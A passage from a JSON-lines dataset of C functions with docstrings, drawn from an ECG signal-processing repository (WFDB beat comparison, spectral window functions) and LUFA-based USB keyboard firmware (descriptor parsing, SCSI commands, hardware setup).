shutdown\n\t\t\t   are paired with X pseudo-beat labels */\n    else\n\treturn ('O');\t/* all other extra test beat labels are paired with\n\t\t\t   O pseudo-beat labels */\n}", "path": "ecg\\third\\eplimited_cpp_old\\bxbep.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* See Oppenheim & Schafer, Digital Signal Processing, p. 242 (1st ed.)\n   The second edition of Numerical Recipes calls this the \"Hann\" window. */\n", "func_signal": "double win_hanning(int j, long n)", "code": "{\n    double a = 2.0*PI/(n-1), w = 0.0;\n\n    w = 0.5 - 0.5*cos(a*j);\n    wsum += w;\n    return (w);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Read and interpret command-line arguments. */\n", "func_signal": "void init(int argc, char *argv[])", "code": "{\n\t int i;\n\t void help();\n\n\t pname = prog_name(argv[0]);\n\t for (i = 1; i < argc; i++) {\n\tif (*argv[i] == '-') switch (*(argv[i]+1)) {\n\t  case 'a':\t/* annotator names follow */\n\t\t if (++i >= argc-1) {\n\t\t(void)fprintf(stderr,\n\t\t\t  \"%s: reference and test annotator names must follow -a\\n\",\n\t\t\t\t pname);\n\t\texit(0);\n\t    }\n\t    an[0].name = argv[i];\n\t    an[1].name = argv[++i];\n\t    break;\n\t  case 'c':\t/* condensed output */\n\t    if (++i >= argc) {\n\t\t(void)fprintf(stderr, \"%s: output file name must follow -c\\n\",\n\t\t\tpname);\n\t\texit(0);\n\t    }\n\t    ofname = argv[i];\n\t    fflag = 1;\n\t    break;\n\t  case 'C':\t/* condensed output with SVEB statistics */\n\t    if (++i >= argc) {\n\t\t(void)fprintf(stderr, \"%s: output file name must follow -C\\n\",\n\t\t\tpname);\n\t\texit(0);\n\t    }\n\t    ofname = argv[i];\n\t    fflag = 4;\n\t    break;\n\t  case 'f':\t/* start time follows */\n\t    if (++i >= argc) {\n\t\t(void)fprintf(stderr,\"%s: start time must follow -f\\n\", pname);\n\t\texit(0);\n\t    }\n\t    start = i;\t/* save arg index, convert to samples later, when\n\t\t\t   record has been opened and sampling frequency is\n\t\t\t   known */\n\t    break;\n\t  case 'h':\t/* print usage summary */\n\t    help();\n\t    exit(0);\n\t    break;\n\t  case 'l':\t/* line-format output */\n\t    if (++i >= argc-1) {\n\t\t(void)fprintf(stderr,\n\t\t\t      \"%s: two output file names must follow -l\\n\",\n\t\t\tpname);\n\t\texit(0);\n\t    }\n\t    ofname = argv[i];\n\t    sfname = argv[++i];\n\t    fflag = 2;\n\t    break;\n\t  case 'L':\t/* line-format output, with SVEB statistics */\n\t    if (++i >= argc-1) {\n\t\t(void)fprintf(stderr,\n\t\t\t      \"%s: two output file names must follow -L\\n\",\n\t\t\tpname);\n\t\texit(0);\n\t    }\n\t    ofname = argv[i];\n\t    sfname = argv[++i];\n\t    fflag = 5;\n\t    break;\n\t  case 'o':\t/* generate output annotation file */\n\t    oflag = 1;\n\t    break;\n\t  case 'O':\t/* generate expanded output annotation file */\n\t    oflag = 1;\n\t    Oflag = 1;\n\t    fflag = 0;\n\t    break;\n\t  case 'r':\t/* record name follows */\n\t    if (++i >= argc) {\n\t\t(void)fprintf(stderr,\n\t\t\t      \"%s: record name must follow -r\\n\", pname);\n\t\texit(0);\n\t    }\n\t //\t record = argv[i];\n\t    break;\n\t  case 's':\t/* standard-format output */\n\t    if (++i >= argc) {\n\t\t(void)fprintf(stderr, \"%s: output file name must follow -s\\n\",\n\t\t\tpname);\n\t\texit(0);\n\t    }\n\t    ofname = argv[i];\n\t    fflag = 3;\n\t    break;\n\t  case 'S':\t/* standard-format output, with SVEB statistics */\n\t    if (++i >= argc) {\n\t\t(void)fprintf(stderr, \"%s: output file name must follow -S\\n\",\n\t\t\tpname);\n\t\texit(0);\n\t    }\n\t    ofname = argv[i];\n\t    fflag = 6;\n\t    break;\n\t  case 't':\t/* end time follows */\n\t    if (++i >= argc) {\n\t\t(void)fprintf(stderr, \"%s: end time must follow -t\\n\", pname);\n\t\texit(0);\n\t    }\n\t    end_time = i;\n\t    break;\n\t  case 'v':\t/* verbose mode */\n\t    verbose = 1;\n\t    break;\n\t  case 'w':\t/* match window follows */\n\t    if (++i >= argc) {\n\t\t(void)fprintf(stderr,\n\t\t\t      \"%s: match window must follow -w\\n\", pname);\n\t\texit(0);\n\t    }\n\t    match_dt = i;\n\t    break;\n\t  default:\n\t    (void)fprintf(stderr,\n\t\t\t  \"%s: unrecognized option %s\\n\", pname, argv[i]);\n\t    exit(0);\n\t}\n\telse {\n\t    (void)fprintf(stderr,\n\t\t\t  \"%s: unrecognized argument %s\\n\",pname,argv[i]);\n\t\t exit(0);\n\t}\n    }\n\n    if (!record || !an[0].name) {\n\thelp();\n\texit(0);\n    }\n\n    if (start != 0L || end_time != 0L || match_dt != 0)\n\t(void)fprintf(stderr,\"%s: (warning) nonstandard comparison selected\\n\",\n\t\tpname);\n\n\t if (sampfreq(record) <= 0) {\n\t(void)fprintf(stderr,\n\t\t      \"%s: (warning) %g Hz sampling frequency assumed\\n\",\n\t\tpname, WFDB_DEFFREQ);\n\t(void)setsampfreq(WFDB_DEFFREQ);\n    }\n\n    /* Set the match window and the times of the start and end of the test\n       period.  Initialize the shutdown tally to 1/2 second so that it will be\n       properly rounded to the nearest second at the end. */\n    if (match_dt)\n\tmatch_dt = (int)strtim(argv[match_dt]);\n    else\n\tmatch_dt = (int)strtim(\".15\");\t\t/* 150 milliseconds */\n    if (start)\n\tstart = strtim(argv[(int)start]);\n    else\n\tstart = strtim(\"5:0\");\t\t\t/* 5 minutes */\n\t if (end_time)\n\tend_time = strtim(argv[(int)end_time]);\n    else if ((end_time = strtim(\"e\")) == 0L)\n\tend_time = -1L;\t\t/* record length unavailable -- go to end of\n\t\t\t\t   reference annotation file */\n\t if (end_time > 0L && end_time < start) {\n\t(void)fprintf(stderr, \"%s: improper interval specified\\n\", pname);\n\texit(0);\n    }\n    shut_down = strtim(\".5\");\t/* 1/2 second */\n\n\t an[0].stat = an[1].stat = WFDB_READ;\n    if (oflag) {\n\tan[2].name = \"bxb\";\n\tan[2].stat = WFDB_WRITE;\n    }\n    if (annopen(record, an, 2 + oflag) < 0) exit(0);\n}", "path": "ecg\\third\\eplimited_cpp_old\\bxbep.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Function `genxcmp' is used only when generating an expanded output\n   annotation file. */\n", "func_signal": "void genxcmp()", "code": "{\n    int alen;\n    static char mstring[550], *p, nullaux[1];\n\n    if (ref_annot.anntyp == 0) getref();\n    if (test_annot.anntyp == 0) gettest();\n    if (!ref_annot.aux) ref_annot.aux = nullaux;\n    if (!test_annot.aux) test_annot.aux = nullaux;\n    while ((end_time > 0L && (T <= end_time || t <= end_time)) ||\n\t   (end_time == -1L && T != huge_time) ||\n\t   (end_time == 0L && T != huge_time && t != huge_time)) {\n\tfor (p = mstring+1; p < mstring + *mstring; p++)\n\t    *p = '\\0';\n\tif (t < T) {\n\t    /* Test annotation precedes reference annotation. */\n\t    if (T-t <= match_dt &&\n\t\t     (T-t < abs(T-tprime) || aprime == 'O')) {\n\t\t/* Annotation times match within the window. */\n\t\tif (test_annot.anntyp != ref_annot.anntyp ||\n\t\t    test_annot.subtyp != ref_annot.subtyp ||\n\t\t    test_annot.chan   != ref_annot.chan   ||\n\t\t    test_annot.num    != ref_annot.num    ||\n\t\t    strcmp(test_annot.aux, ref_annot.aux)) {\n\t\t    /* Annotation types, subtypes, ..., don't match. */\n\t\t    p = mstring+1;\n\t\t    (void)strcat(p, annstr(ref_annot.anntyp));\n\t\t    p += strlen(p);\n\t\t    if (test_annot.subtyp != ref_annot.subtyp ||\n\t\t\ttest_annot.chan   != ref_annot.chan   ||\n\t\t\ttest_annot.num    != ref_annot.num) {\n\t\t\t(void)sprintf(p, \"[%d,%d,%d]\", ref_annot.subtyp,\n\t\t\t\tref_annot.chan, ref_annot.num);\n\t\t\tp += strlen(p);\n\t\t    }\n\t\t    if (*ref_annot.aux) {\n\t\t\t(void)sprintf(p, \" (%s)\", ref_annot.aux+1);\n\t\t\tp += strlen(p);\n\t\t    }\n\t\t    (void)sprintf(p, \"/%s\", annstr(test_annot.anntyp));\n\t\t    p += strlen(p);\n\t\t    if (*test_annot.aux)\n\t\t\t(void)sprintf(p, \" (%s)\", test_annot.aux+1);\n\t\t    alen = strlen(mstring+1);\n\t\t    if (alen > 254) {\n\t\t\t(void)fprintf(stderr,\n\t\t\t\t      \"aux string truncated at %s (%ld)\\n\",\n\t\t\t\ttimstr(test_annot.time), test_annot.time);\n\t\t\talen = 254;\n\t\t\tmstring[alen+1] = '\\0';\n\t\t    }\n\t\t    mstring[0] = alen;\n\t\t    test_annot.aux = mstring;\n\t\t    test_annot.anntyp = NOTE;\n\t\t}\n\t\t(void)putann(0, &test_annot);\n\t\tgetref();\n\t\tgettest();\n\t\tif (!ref_annot.aux) ref_annot.aux = nullaux;\n\t\tif (!test_annot.aux) test_annot.aux = nullaux;\n\t    }\n\t    else {\n\t\t/* No matching reference annotation. */\n\t\tp = mstring+1;\n\t\t(void)sprintf(p, \"%c/%s\",\n\t\t\t   rpann(test_annot.time), annstr(test_annot.anntyp));\n\t\tp += strlen(p);\n\t\tif (*test_annot.aux)\n\t\t    (void)sprintf(p, \" (%s)\", test_annot.aux+1);\n\t\talen = strlen(mstring+1);\n\t\tif (alen > 254) {\n\t\t    (void)fprintf(stderr, \"aux string truncated at %s (%ld)\\n\",\n\t\t\t    timstr(test_annot.time), test_annot.time);\n\t\t    alen = 254;\n\t\t    mstring[alen+1] = '\\0';\n\t\t}\n\t\tmstring[0] = alen;\n\t\ttest_annot.aux = mstring;\n\t\ttest_annot.anntyp = NOTE;\n\t\t(void)putann(0, &test_annot);\n\t\tgettest();\n\t\tif (!test_annot.aux) test_annot.aux = nullaux;\n\t    }\n\t}\n\telse {\n\t    /* Reference annotation precedes test annotation. */\n\t    if (t-T <= match_dt &&\n\t\t     (t-T < abs(t-Tprime) || Aprime == 'O')) {\n\t\t/* Annotation times match within the window. */\n\t\tif (test_annot.anntyp != ref_annot.anntyp ||\n\t\t    test_annot.subtyp != ref_annot.subtyp ||\n\t\t    test_annot.chan   != ref_annot.chan   ||\n\t\t    test_annot.num    != ref_annot.num    ||\n\t\t    strcmp(test_annot.aux, ref_annot.aux)) {\n\t\t    /* Annotation types, subtypes, ..., don't match. */\n\t\t    p = mstring+1;\n\t\t    (void)strcat(p, annstr(ref_annot.anntyp));\n\t\t    p += strlen(p);\n\t\t    if (test_annot.subtyp != ref_annot.subtyp ||\n\t\t\ttest_annot.chan   != ref_annot.chan   ||\n\t\t\ttest_annot.num    != ref_annot.num) {\n\t\t\t(void)sprintf(p, \"[%d,%d,%d]\", ref_annot.subtyp,\n\t\t\t\tref_annot.chan, ref_annot.num);\n\t\t\tp += strlen(p);\n\t\t    }\n\t\t    if (*ref_annot.aux) {\n\t\t\t(void)sprintf(p, \" (%s)\", ref_annot.aux+1);\n\t\t\tp += strlen(p);\n\t\t    }\n\t\t    (void)sprintf(p, \"/%s\", annstr(test_annot.anntyp));\n\t\t    p += strlen(p);\n\t\t    if (*test_annot.aux)\n\t\t\t(void)sprintf(p, \" (%s)\", test_annot.aux+1);\n\t\t    alen = strlen(mstring+1);\n\t\t    if (alen > 254) {\n\t\t\t(void)fprintf(stderr,\n\t\t\t\t      \"aux string truncated at %s (%ld)\\n\",\n\t\t\t\ttimstr(test_annot.time), test_annot.time);\n\t\t\talen = 254;\n\t\t\tmstring[alen+1] = '\\0';\n\t\t    }\n\t\t    mstring[0] = alen;\n\t\t    test_annot.aux = mstring;\n\t\t    test_annot.anntyp = NOTE;\n\t\t}\n\t\t(void)putann(0, &test_annot);\n\t\tgetref();\n\t\tgettest();\n\t\tif (!ref_annot.aux) ref_annot.aux = nullaux;\n\t\tif (!test_annot.aux) test_annot.aux = nullaux;\n\t    }\n\t    else {\n\t\t/* No matching test annotation. */\n\t\tp = mstring+1;\n\t\t(void)sprintf(p, \"%s\", annstr(ref_annot.anntyp));\n\t\tp += strlen(p);\n\t\tif (*ref_annot.aux) {\n\t\t    (void)sprintf(p, \" (%s)\", ref_annot.aux+1);\n\t\t    p += strlen(p);\n\t\t}\n\t\t(void)sprintf(p, \"/%c\", tpann(ref_annot.time));\n\t\talen = strlen(mstring+1);\n\t\tif (alen > 254) {\n\t\t    (void)fprintf(stderr, \"aux string truncated at %s (%ld)\\n\",\n\t\t\t    timstr(ref_annot.time), ref_annot.time);\n\t\t    alen = 254;\n\t\t    mstring[alen+1] = '\\0';\n\t\t}\n\t\tmstring[0] = alen;\n\t\tref_annot.aux = mstring;\n\t\tref_annot.anntyp = NOTE;\n\t\t(void)putann(0, &ref_annot);\n\t\tgetref();\n\t\tif (!ref_annot.aux) ref_annot.aux = nullaux;\n\t    }\n\t}\n    }\n}", "path": "ecg\\third\\eplimited_cpp_old\\bxbep.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* See any of the above references. */\n", "func_signal": "double win_square(int j, long n)", "code": "{\n    if (j < n)\t\t/* to quiet the compiler */\n       wsum += 1.0;\n    return (1.0);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* See Press, Flannery, Teukolsky, & Vetterling, Numerical Recipes in C,\n   p. 442 (1st ed.) or p. 554 (2nd ed.) */\n", "func_signal": "double win_welch(int j, long n)", "code": "{\n    double a = (n-1)/2.0, w = 0.0;\n\n    w = (j-a)/(a+1);\n    w = 1 - w*w;\n    wsum += w;\n    return (w);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* See Oppenheim & Schafer, Digital Signal Processing, p. 242 (1st ed.) */\n", "func_signal": "double win_hamming(int j, long n)", "code": "{\n    double a = 2.0*PI/(n-1), w = 0.0;\n\n    w = 0.54 - 0.46*cos(a*j);\n    wsum += w;\n    return (w);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Read input data, allocating and filling x[] and y[].  The return value is\n   the number of points read.\n\n   This function allows the input buffers to grow as large as necessary, up to\n   the available memory (assuming that a long int is large enough to address\n   any memory location). */\n", "func_signal": "long input( )", "code": "{\n    long npts = 0L;\n\n    if (((data = (double *)malloc(nmax * sizeof(double))) == NULL) ||\n\t((wk1 = (double *)malloc(64 * nmax * sizeof(double))) == NULL) ||\n\t((wk2 = (double *)malloc(64 * nmax * sizeof(double))) == NULL)) {\n\tif (data) (void)free(data);\n\tif (wk1) (void)free(wk1);\n\tfclose(ifile);\n        error(\"insufficient memory\");\n    }\n\n    while (fscanf(ifile, \"%lf\", &data[npts]) == 1) {\n        if (++npts >= nmax) {\t/* double the size of the input buffers */\n\t    long nmaxt = nmax << 1;\n\t    double *datat = NULL, *w1t = NULL, *w2t = NULL;\n\n\t    if ((long)(nmaxt * sizeof(double)) < nmax) {\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %ld\\n\",\n\t\t\tpname, npts);\n\t        break;\n\t    }\n\t    if ((datat = (double *)realloc(data,nmaxt*sizeof(double)))==NULL) {\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %ld\\n\",\n\t\t\tpname, npts);\n\t        break;\n\t    }\n\t    data = datat;\n\t    if ((w1t = (double *)realloc(wk1,64*nmaxt*sizeof(double)))==NULL) {\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %ld\\n\",\n\t\t\tpname, npts);\n\t        break;\n\t    }\n\t    wk1 = w1t;\n\t    if ((w2t = (double *)realloc(wk2,64*nmaxt*sizeof(double)))==NULL) {\n\t\tfprintf(stderr,\n\t\t      \"%s: insufficient memory, truncating input at row %ld\\n\",\n\t\t\tpname, npts);\n\t        break;\n\t    }\n\t    wk2 = w2t;\n\t    nmax = nmaxt;\n\t}\n    }\n\n    fclose(ifile);\n    if (npts < 1) error(\"no data read\");\n    return (npts);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* See Oppenheim & Schafer, Digital Signal Processing, p. 242 (1st ed.) */\n", "func_signal": "double win_blackman(int j, long n)", "code": "{\n    double a = 2.0*PI/(n-1), w = 0.0;\n\n    w = 0.42 - 0.5*cos(a*j) + 0.08*cos(2*a*j);\n    wsum += w;\n    return (w);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Calculate coefficients for MEM spectral estimation.  See Numerical Recipes,\n   pp. 447-451. */\n", "func_signal": "int memcof(double *data, long n, long m, double *pm, double *cof)", "code": "{\n    int i = 0, j = 0, k = 0;\n    double denom = 0.0, num = 0.0, p = 0.0;\n\n    for (j = 0; j < n; j++)\n\tp += data[j]*data[j];\n    *pm = p/n;\n    wk1[0] = data[0];\n    wk2[n-2] = data[n-1];\n    for (j = 1; j < n-1; j++) {\n\twk1[j] = data[j];\n\twk2[j-1] = data[j];\n    }\n    for (k = 0; k < m; k++) {\n\tfor (j = 0, num = denom = 0.0; j < n-k-1; j++) {\n\t    num += wk1[j]*wk2[j];\n\t    denom += wk1[j]*wk1[j] + wk2[j]*wk2[j];\n\t}\n\tcof[k] = 2.0*num/denom;\n\t*pm *= 1.0 - cof[k]*cof[k];\n\tif (k)\n\t    for (i = 0; i < k; i++)\n\t\tcof[i] = wkm[i] - cof[k]*wkm[k-i-1];\n\tif (k != m-1) {\n\t    for (i = 0; i <= k; i++)\n\t\twkm[i] = cof[i];\n\t    for (j = 0; j < n-k-2; j++) {\n\t\twk1[j] -= wkm[k]*wk2[j];\n\t\twk2[j] = wk2[j+1] - wkm[k]*wk1[j+1];\n\t    }\n\t}\n    }\n    return 0;\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* Effect any mode changes that were selected and make the popup disappear. */\n", "func_signal": "void dismiss_mode()", "code": "{\n    /* If the panel is currently visible, make it go away. */\n    if (mode_popup_active > 0 &&\n\t(int)xv_get(mode_frame, FRAME_CMD_PUSHPIN_IN) == FALSE) {\n\txv_set(mode_frame, WIN_SHOW, FALSE, 0);\n\tmode_popup_active = 0;\n    }\n    set_modes();\n}", "path": "ecg\\third\\wfdb-10.5.4\\wave\\modepan.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/* See Press, Flannery, Teukolsky, & Vetterling, Numerical Recipes in C,\n   p. 442 (1st ed.) */\n", "func_signal": "double win_parzen(int j, long n)", "code": "{\n    double a = (n-1)/2.0, w = 0.0;\n\n    if ((w = (j-a)/(a+1)) > 0.0) w = 1 - w;\n    else w = 1 + w;\n    wsum += w;\n    return (w);\n}", "path": "ecg\\third\\wfdb-10.5.4\\psd\\memse.c", "repo_name": "kastur/ECGCS", "stars": 33, "license": "None", "language": "c", "size": 5276}
{"docstring": "/** Descriptor comparator function. This comparator function is can be called while processing an attached USB device's\n *  configuration descriptor, to search for a specific sub descriptor. It can also be used to abort the configuration\n *  descriptor processing if an incompatible descriptor configuration is found.\n *\n *  This comparator searches for the next Endpoint descriptor inside the current interface descriptor,\n *  aborting the search if another interface descriptor is found before the required endpoint.\n *\n *  \\return A value from the DSEARCH_Return_ErrorCodes_t enum\n */\n", "func_signal": "uint8_t DComp_NextHIDInterfaceDataEndpoint(void* CurrentDescriptor)", "code": "{\n\t/* Determine the type of the current descriptor */\n\tif (DESCRIPTOR_TYPE(CurrentDescriptor) == DTYPE_Endpoint)\n\t{\n\t\t/* Indicate that the descriptor being searched for has been found */\n\t\treturn DESCRIPTOR_SEARCH_Found;\n\t}\n\telse if (DESCRIPTOR_TYPE(CurrentDescriptor) == DTYPE_Interface)\n\t{\n\t\t/* Indicate that the search has failed prematurely and should be aborted */\n\t\treturn DESCRIPTOR_SEARCH_Fail;\n\t}\n\n\t/* Current descriptor does not match what this comparator is looking for */\n\treturn DESCRIPTOR_SEARCH_NotFound;\n}", "path": "firmware\\lufa-100513\\Demos\\Host\\LowLevel\\GenericHIDHost\\ConfigDescriptor.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Command processing for an issued SCSI INQUIRY command. This command returns information about the device's features\n *  and capabilities to the host.\n *\n *  \\param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface structure that the command is associated with\n */\n", "func_signal": "static void SCSI_Command_Inquiry(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)", "code": "{\n\tuint16_t AllocationLength  = (((uint16_t)MSInterfaceInfo->State.CommandBlock.SCSICommandData[3] << 8) |\n\t                                         MSInterfaceInfo->State.CommandBlock.SCSICommandData[4]);\n\tuint16_t BytesTransferred  = (AllocationLength < sizeof(InquiryData))? AllocationLength :\n\t                                                                       sizeof(InquiryData);\n\n\t/* Only the standard INQUIRY data is supported, check if any optional INQUIRY bits set */\n\tif ((MSInterfaceInfo->State.CommandBlock.SCSICommandData[1] & ((1 << 0) | (1 << 1))) ||\n\t     MSInterfaceInfo->State.CommandBlock.SCSICommandData[2])\n\t{\n\t\t/* Optional but unsupported bits set - update the SENSE key and fail the request */\n\t\tSCSI_SET_SENSE(SCSI_SENSE_KEY_ILLEGAL_REQUEST,\n\t\t               SCSI_ASENSE_INVALID_FIELD_IN_CDB,\n\t\t               SCSI_ASENSEQ_NO_QUALIFIER);\n\n\t\treturn;\n\t}\n\t\n\tEndpoint_Write_Stream_LE(&InquiryData, BytesTransferred, NO_STREAM_CALLBACK);\n\n\tuint8_t PadBytes[AllocationLength - BytesTransferred];\n\t\n\t/* Pad out remaining bytes with 0x00 */\n\tEndpoint_Write_Stream_LE(&PadBytes, (AllocationLength - BytesTransferred), NO_STREAM_CALLBACK);\n\n\t/* Finalize the stream transfer to send the last packet */\n\tEndpoint_ClearIN();\n\n\t/* Succeed the command and update the bytes transferred counter */\n\tMSInterfaceInfo->State.CommandBlock.DataTransferLength -= BytesTransferred;\n}", "path": "firmware\\lufa-100513\\Projects\\Webserver\\Lib\\SCSI.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Configures the board hardware and chip peripherals for the demo's functionality. */\n", "func_signal": "void SetupHardware()", "code": "{\n  /* Disable clock division */\n  clock_prescale_set(clock_div_2);\n\n  /* Disable watchdog if enabled by bootloader/fuses */\n  MCUSR &= ~(1 << WDRF);\n  wdt_disable();\n\n  /* Hardware Initialization */\n  LEDs_Init();\n  USB_Init();\n  USB_PLL_On();\n  while (!USB_PLL_IsReady());\n\n  /* Task init */\n#ifndef MATRIX_DISCOVERY_MODE\n  Keyboard__init();\n#else\n  MatrixDiscovery__init();\n#endif\n\n  g_num_lock = g_caps_lock = g_scrl_lock = 0;\n\n#if defined(BOOTLOADER_TEST)\n  uint8_t bootloader = eeprom_read_byte(&ee_bootloader);\n  if (bootloader == 0xff) // eeprom has been reset\n  {\n    eeprom_write_byte(&ee_bootloader, FALSE);\n  }\n  else if (bootloader == TRUE)\n  {\n    asm(\"jmp 0xF000\");\n  }\n#endif\n}", "path": "firmware\\src\\Keyboard.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Configures the board hardware and chip peripherals for the demo's functionality. */\n", "func_signal": "void SetupHardware(void)", "code": "{\n\t/* Disable watchdog if enabled by bootloader/fuses */\n\tMCUSR &= ~(1 << WDRF);\n\twdt_disable();\n\n\t/* Disable clock division */\n\tclock_prescale_set(clock_div_1);\n\t\n\t/* Hardware Initialization */\n\tLEDs_Init();\n\tUSB_Init();\n\tADC_Init(ADC_FREE_RUNNING | ADC_PRESCALE_32);\n\tADC_SetupChannel(MIC_IN_ADC_CHANNEL);\n\t\n\t/* Start the ADC conversion in free running mode */\n\tADC_StartReading(ADC_REFERENCE_AVCC | ADC_RIGHT_ADJUSTED | MIC_IN_ADC_MUX_MASK);\n}", "path": "firmware\\lufa-100513\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Configures the board hardware and chip peripherals for the demo's functionality. */\n", "func_signal": "void SetupHardware(void)", "code": "{\n\t/* Disable watchdog if enabled by bootloader/fuses */\n\tMCUSR &= ~(1 << WDRF);\n\twdt_disable();\n\n\t/* Disable clock division */\n\tclock_prescale_set(clock_div_1);\n\n\t/* Hardware Initialization */\n\tLEDs_Init();\n\tSerialStream_Init(9600, false);\n\tUSB_Init();\n}", "path": "firmware\\lufa-100513\\Demos\\Device\\ClassDriver\\RNDISEthernet\\RNDISEthernet.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Event handler for the library USB Configuration Changed event. */\n", "func_signal": "void EVENT_USB_Device_ConfigurationChanged(void)", "code": "{\n\tLEDs_SetAllLEDs(LEDMASK_USB_READY);\n\n\tif (!(RNDIS_Device_ConfigureEndpoints(&Ethernet_RNDIS_Interface)))\n\t  LEDs_SetAllLEDs(LEDMASK_USB_ERROR);\n}", "path": "firmware\\lufa-100513\\Demos\\Device\\ClassDriver\\RNDISEthernet\\RNDISEthernet.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Event handler for the library USB Configuration Changed event. */\n", "func_signal": "void EVENT_USB_Device_ConfigurationChanged(void)", "code": "{\n\tLEDs_SetAllLEDs(LEDMASK_USB_READY);\n\t\n\tif (!(Audio_Device_ConfigureEndpoints(&Microphone_Audio_Interface)))\n\t  LEDs_SetAllLEDs(LEDMASK_USB_ERROR);\n}", "path": "firmware\\lufa-100513\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Command processing for an issued SCSI REQUEST SENSE command. This command returns information about the last issued command,\n *  including the error code and additional error information so that the host can determine why a command failed to complete.\n *\n *  \\param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface structure that the command is associated with\n */\n", "func_signal": "static void SCSI_Command_Request_Sense(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)", "code": "{\n\tuint8_t  AllocationLength = MSInterfaceInfo->State.CommandBlock.SCSICommandData[4];\n\tuint8_t  BytesTransferred = (AllocationLength < sizeof(SenseData))? AllocationLength : sizeof(SenseData);\n\t\n\tuint8_t PadBytes[AllocationLength - BytesTransferred];\n\n\tEndpoint_Write_Stream_LE(&SenseData, BytesTransferred, NO_STREAM_CALLBACK);\n\tEndpoint_Write_Stream_LE(&PadBytes, (AllocationLength - BytesTransferred), NO_STREAM_CALLBACK);\n\tEndpoint_ClearIN();\n\n\t/* Succeed the command and update the bytes transferred counter */\n\tMSInterfaceInfo->State.CommandBlock.DataTransferLength -= BytesTransferred;\n}", "path": "firmware\\lufa-100513\\Projects\\Webserver\\Lib\\SCSI.c", "repo_name": "humblehacker/keyboard", "stars": 34, "license": "None", "language": "c", "size": 11676}
{"docstring": "/** Reads and processes an attached device's descriptors, to determine compatibility and pipe configurations. This\n *  routine will read in the entire configuration descriptor, and configure the hosts pipes to correctly communicate\n *  with compatible devices.\n *\n *  This routine searches for a HID interface descriptor containing at least one Interrupt type IN endpoint.\n *\n *  \\return An error code from the \\ref GenericHIDHost_GetConfigDescriptorDataCodes_t enum.\n */\n", "func_signal": "uint8_t ProcessConfigurationDescriptor(void)", "code": "{\n\tuint8_t  ConfigDescriptorData[512];\n\tvoid*    CurrConfigLocation = ConfigDescriptorData;\n\tuint16_t CurrConfigBytesRem;\n\tuint8_t  FoundEndpoints = 0;\n\n\t/* Retrieve the entire configuration descriptor into the allocated buffer */\n\tswitch (USB_Host_GetDeviceConfigDescriptor(1, &CurrConfigBytesRem, ConfigDescriptorData, sizeof(ConfigDescriptorData)))\n\t{\n\t\tcase HOST_GETCONFIG_Successful:\n\t\t\tbreak;\n\t\tcase HOST_GETCONFIG_InvalidData:\n\t\t\treturn InvalidConfigDataReturned;\n\t\tcase HOST_GETCONFIG_BuffOverflow:\n\t\t\treturn DescriptorTooLarge;\n\t\tdefault:\n\t\t\treturn ControlError;\n\t}\n\t\n\t/* Get the HID interface from the configuration descriptor */\n\tif (USB_GetNextDescriptorComp(&CurrConfigBytesRem, &CurrConfigLocation,\n\t                              DComp_NextHIDInterface) != DESCRIPTOR_SEARCH_COMP_Found)\n\t{\n\t\t/* Descriptor not found, error out */\n\t\treturn NoHIDInterfaceFound;\n\t}\n\n\twhile (FoundEndpoints != ((1 << HID_DATA_IN_PIPE) | (1 << HID_DATA_OUT_PIPE)))\n\t{\n\t\t/* Get the next HID interface's data endpoint descriptor */\n\t\tif (USB_GetNextDescriptorComp(&CurrConfigBytesRem, &CurrConfigLocation,\n\t\t                              DComp_NextHIDInterfaceDataEndpoint) != DESCRIPTOR_SEARCH_COMP_Found)\n\t\t{\n\t\t\t/* Not all HID devices have an OUT endpoint - if we've reached the end of the HID descriptor\n\t\t\t * but only found the mandatory IN endpoint, it's safe to continue with the device 